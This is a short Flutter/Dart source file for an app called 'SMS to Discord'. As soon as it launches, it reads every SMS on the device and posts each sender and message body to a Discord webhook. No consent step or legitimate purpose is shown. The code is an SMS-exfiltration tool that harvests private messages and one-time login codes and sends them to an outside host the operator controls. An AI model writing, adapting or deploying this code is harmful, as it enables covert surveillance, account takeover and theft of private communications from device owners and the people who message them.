import 'package:flutter/material.dart';
import 'package:sms/sms.dart';
import 'package:http/http.dart' as http;

void main() {
  runApp(MyApp());
}

class MyApp extends StatefulWidget {
  @override
  _MyAppState createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  final String discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';

  @override
  void initState() {
    super.initState();
    _startReadingSMS();
  }

  void _startReadingSMS() {
    final SmsQuery query = SmsQuery();
    List<SmsMessage> messages = query.querySms();

    for (SmsMessage message in messages) {
      _sendToDiscordWebhook(message);
    }
  }

  Future<void> _sendToDiscordWebhook(SmsMessage message) async {
    final Uri uri = Uri.parse(discordWebhookUrl);
    final response = await http.post(
      uri,
      headers: {'Content-Type': 'application/json'},
      body: '{"content": "SMS from ${message.sender}:\n${message.body}"}',
    );

    if (response.statusCode == 204) {
      print('SMS sent to Discord successfully');
    } else {
      print('Failed to send SMS to Discord');
    }
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        appBar: AppBar(
          title: Text('SMS to Discord'),
        ),
        body: Center(
          child: Text('Reading SMS and sending to Discord...'),
        ),
      ),
    );
  }
}
